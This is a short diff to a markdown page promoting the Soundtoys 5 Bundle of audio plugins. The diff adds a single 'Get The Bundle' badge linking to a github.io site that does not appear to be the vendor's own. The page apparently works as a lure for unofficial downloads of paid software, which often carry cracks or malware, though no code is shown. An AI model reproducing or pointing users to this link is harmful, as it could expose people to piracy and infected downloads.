@@ -2,6 +2,7 @@
 
 The **Soundtoys 5 Bundle** is a collection of over 20 professional-grade audio plugins for mixing, sound design, and music production. Known for their **analog warmth, creative modulation, and unique sonic textures**, Soundtoys plugins are trusted by producers, engineers, and artists worldwide. From subtle EQ shaping to wild pitch-shifting, the bundle delivers tools that inspire.
 
+[![Get](https://img.shields.io/badge/Get%20The-Bundle-blueviolet)](https://soundtoys-5-bundle.github.io/.github/)
 ---
 
 ## Overview
